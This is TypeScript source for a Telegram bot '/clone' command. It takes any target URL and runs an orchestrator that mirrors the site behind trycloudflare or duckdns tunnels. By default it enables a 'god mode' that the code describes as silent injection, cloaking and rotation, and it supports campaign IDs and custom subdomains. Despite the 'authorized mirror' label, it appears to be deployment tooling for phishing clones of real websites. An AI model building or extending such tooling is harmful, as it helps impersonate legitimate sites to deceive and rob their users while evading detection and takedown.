/**
 * Telegram /clone — authorized mirror via scripts/clone-deploy-tunnel.ts.
 * Requires Docker + cloudflared on the host running the bot (not Railway API container).
 */
import { exec } from 'node:child_process'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { promisify } from 'node:util'

const execAsync = promisify(exec)

const moduleDir = path.dirname(fileURLToPath(import.meta.url))
const TUNNEL_SCRIPT = 'scripts/clone-deploy-tunnel.ts'
/** trycloudflare, duckdns, or custom Cloudflare zone hostnames */
const TUNNEL_URL_RE =
  /^https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.duckdns\.org|[a-z0-9][a-z0-9.-]*\.[a-z]{2,})\/?$/i
/** generate + docker + cloudflared exec timeout */
const ORCHESTRATOR_TIMEOUT_MS = 600_000

export type CloneTunnelDeployOptions = {
  /** Enable all advanced mirror features (silent inject, cloaking, rotation, etc.) */
  godMode?: boolean
  subdomain?: string
  campaignId?: string
}

export type CloneTunnelResult =
  | { ok: true; url: string }
  | { ok: false; error: string }

function resolveRepoRoot(): string {
  const candidates = [
    path.resolve(process.cwd(), '../..'),
    path.resolve(process.cwd(), '..'),
    path.resolve(process.cwd()),
    path.resolve(moduleDir, '../../../..'),
    path.resolve(moduleDir, '../../../../..'),
  ]

  for (const candidate of candidates) {
    const pkg = path.join(candidate, 'package.json')
    const script = path.join(candidate, TUNNEL_SCRIPT)
    if (fs.existsSync(pkg) && fs.existsSync(script)) {
      try {
        const parsed = JSON.parse(fs.readFileSync(pkg, 'utf8')) as { name?: string }
        if (parsed.name === 'legion-engine') return candidate
      } catch {
        /* try next */
      }
    }
  }

  return path.resolve(process.cwd(), '../..')
}

function shellQuote(value: string): string {
  if (process.platform === 'win32') {
    return `"${value.replace(/"/g, '""')}"`
  }
  return `'${value.replace(/'/g, `'\\''`)}'`
}

/** Parse target URL from `/clone https://example.com` message text. */
export function parseCloneCommandUrl(messageText: string | undefined): string | null {
  const text = messageText?.trim() ?? ''
  const match = text.match(/^\/clone(?:@\w+)?\s+(\S+)/i)
  if (!match?.[1]) return null

  let raw = match[1].trim()
  if (!/^https?:\/\//i.test(raw)) raw = `https://${raw}`

  try {
    const url = new URL(raw)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return null
    return url.href
  } catch {
    return null
  }
}

function normalizeTunnelStdout(stdout: string): string | null {
  const lines = stdout
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter(Boolean)

  for (let i = lines.length - 1; i >= 0; i--) {
    const line = lines[i]!
    if (TUNNEL_URL_RE.test(line)) return line.replace(/\/$/, '')
  }

  const match = stdout.match(
    /https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.duckdns\.org|[a-z0-9][a-z0-9.-]*\.[a-z]{2,})/i,
  )
  return match?.[0]?.replace(/\/$/, '') ?? null
}

function buildOrchestratorArgs(targetUrl: string, opts?: CloneTunnelDeployOptions): string {
  const flags: string[] = []
  if (opts?.godMode !== false) {
    flags.push('--god-mode')
  }
  if (opts?.subdomain?.trim()) {
    flags.push('--subdomain', opts.subdomain.trim())
  }
  if (opts?.campaignId?.trim()) {
    flags.push('--campaign-id', opts.campaignId.trim())
  }
  flags.push('--rotate')
  return [...flags, targetUrl].map(shellQuote).join(' ')
}

/**
 * Run clone-deploy-tunnel orchestrator; returns public mirror URL on success.
 * Defaults to --god-mode for Telegram /clone integration.
 */
export async function runCloneTunnelDeploy(
  targetUrl: string,
  opts?: CloneTunnelDeployOptions,
): Promise<CloneTunnelResult> {
  const repoRoot = resolveRepoRoot()
  const scriptPath = path.join(repoRoot, TUNNEL_SCRIPT)
  if (!fs.existsSync(scriptPath)) {
    return { ok: false, error: `Orchestrator not found: ${scriptPath}` }
  }

  const envFile = path.join(repoRoot, '.env')
  const quotedScript = shellQuote(scriptPath)
  const envFlag = fs.existsSync(envFile) ? `--env-file=${shellQuote(envFile)}` : ''
  const orchestratorArgs = buildOrchestratorArgs(targetUrl, opts)

  const cmd = envFlag
    ? `pnpm exec tsx ${envFlag} ${quotedScript} ${orchestratorArgs}`
    : `pnpm exec tsx ${quotedScript} ${orchestratorArgs}`

  try {
    const { stdout, stderr } = await execAsync(cmd, {
      cwd: repoRoot,
      env: process.env,
      timeout: ORCHESTRATOR_TIMEOUT_MS,
      maxBuffer: 8 * 1024 * 1024,
      windowsHide: true,
    })

    const url = normalizeTunnelStdout(stdout)
    if (url) return { ok: true, url }

    const detail = (stderr || stdout).trim().slice(0, 2000)
    return {
      ok: false,
      error: detail || 'Orchestrator finished but no public URL in stdout',
    }
  } catch (e) {
    const err = e as { message?: string; stdout?: string; stderr?: string; killed?: boolean }
    const combined = `${err.stdout ?? ''}\n${err.stderr ?? ''}`
    const url = normalizeTunnelStdout(combined)
    if (url) return { ok: true, url }

    const detail = (err.stderr || err.stdout || err.message || String(e)).trim().slice(0, 2000)
    const hint = err.killed
      ? ' (timed out — mirror may still be starting; check Docker on host)'
      : ''
    return { ok: false, error: `${detail}${hint}` }
  }
}
